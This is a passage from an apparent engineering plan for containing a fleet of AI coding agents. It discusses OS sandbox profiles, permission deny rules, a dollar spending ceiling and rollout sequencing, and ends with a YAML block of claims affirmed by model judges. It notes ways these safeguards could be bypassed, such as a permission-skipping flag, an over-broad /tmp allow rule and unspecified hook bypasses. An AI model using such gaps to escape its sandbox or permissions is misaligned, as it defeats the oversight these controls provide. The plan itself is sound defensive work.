| **After Z1 passes** | Propagates the fully validated system; fleet sees the OS sandbox, the dollar ceiling, and the compiled lenses all at once |
| **After Phase 5 (Mission Control complete)** | Propagates earlier; the fleet can see the Mission Control read plane immediately; Z1 is a per-project question that follows |
| **Keep the 2026-08-11 decision** | Same as option A — Z1 is Phase 6, fleet is Phase 7 |

**Recommendation:** Keep the existing decision. The sequencing is already locked and recorded. Reopening it here is only worth doing if the cost of 12 projects running old launchers is measurably growing — and the 2026-08-12 stop-condition-5b measurement showed the generation count is flat.

---

## 7 · What could make this plan wrong

These are not risks to mitigate — they are hypotheses that would change the plan if they proved true.

**1. `--dangerously-skip-permissions` does not bypass `settings.json` deny rules.**
The plan treats this as confirmed. If the flag only bypasses the interactive confirmation prompt (not the deny rules), then Phase 0-D removes a flag for a different reason than stated, and the settings.json deny list is more protective than assumed. Verification: add a deny rule for a known safe command, run with the flag, confirm it is denied. Do this before committing Phase 0-D.

**2. The OS sandbox blocks legitimate claude operations.**
Seatbelt profiles are deny-default. The first version of the profile will block something the agent needs. If the profile is too restrictive and the fix is "add a wildcard allow for `/tmp`", the containment is no better than having no profile. The complain-mode run in Phase 4-A is designed to catch this before Phase 4-B locks it in.

**3. Z1 fails because of a problem the plan cannot fix.**
If the venture run reveals that the core engine interaction (orchestrator → framer → sourcer) does not produce a usable artifact for reasons architectural rather than bug-level, the plan's entire Wave F assumption is wrong. The Z1-PREDICTIONS document is what turns this from a surprise into a falsifiable prediction. If the predictions miss by more than 30%, the gap itself is information about where the architecture needs revision.

**4. The dollar ceiling fires on legitimate work before it fires on runaway work.**
If a normal heavy session costs more than $20 (the proposed block threshold), Phase 2 creates a ceiling that interrupts correct work. The conservative threshold is calibrated against "~$3/h × 5h window = $15 observed peak" — but that measurement was of a single session, not the peak across the 99-transcript corpus. Verify the distribution of 5-hour-window costs across the corpus before setting the threshold.

**5. The lens generator (Phase 3-C) adds more complexity than the 25 KB runtime dump costs.**
If the generator fails silently in CI, every agent runs on stale compiled lenses and nobody notices until a procedure diverges from the YAML. The cross-check that detects this (generator `--verify` flag + CI step) must exist before the generator ships, not after. If it cannot be written, the generator should not ship.

**6. The claim `c-venture-task-complete` cannot be verified by command.**
The Z1 debrief claim will have `verified_by: judge` (two independent models agree the artifact is a real venture output). A `judge` resolver that calls a model in CI requires model credentials in CI. The plan currently has no model credentials in CI (this was the reason Phase 3 deferred the judge resolver). If Z1 produces a `judge` claim and CI cannot verify it, stop condition 6 never closes automatically — it stays an assertion. This is acceptable as a deferred Phase 7 problem only if Z1's claim is recorded with `enforcement: shadow` until CI gets credentials.

---

```claims
- id: c-impl-plan-phase0-priority
  assert: "Phase 0 (safety floor) must ship as one atomic irreversible-tier PR before any other phase begins"
  kind: judgment
  scope: project
  verified_by: judge
  evidence:
    judgments:
      - model: claude-sonnet-4-6
        verdict: affirmed
        rationale: "Three open RCEs plus hook bypass plus unregistered budget ceiling make every subsequent phase more dangerous, not less. The cost of shipping out of order is unbounded."
  valid_until: 2027-02-14
  enforcement: block
  supports: [IMPLEMENTATION-PLAN.md]

- id: c-impl-plan-z1-before-fleet
  assert: "Z1 (one real venture task) must complete before fleet rollout"
  kind: judgment
  scope: project
  verified_by: judge
  evidence:
    judgments:
      - model: claude-sonnet-4-6
        verdict: affirmed
        rationale: "Propagating a system to 12 projects before verifying it completes a task it did not author propagates an unverified system 12 times."
  valid_until: 2027-02-14
  enforcement: block
  supports: [IMPLEMENTATION-PLAN.md]

- id: c-impl-plan-dollar-ceiling
  assert: "budget-guard.js ceiling is measured in dollars, not output tokens; output tokens are 11.3% of the measured bill"
  kind: internal-fact
  scope: project
  verified_by: command
  evidence:
    cmd: "node -e \"const u=require('./scripts/lib/usage.js'); console.log(JSON.stringify(u.turnsFrom('')))\""
    expect_contains: "cache_read"
    accessed: 2026-08-14
  valid_until: 2026-11-14
  enforcement: block
  supports: [IMPLEMENTATION-PLAN.md]
```
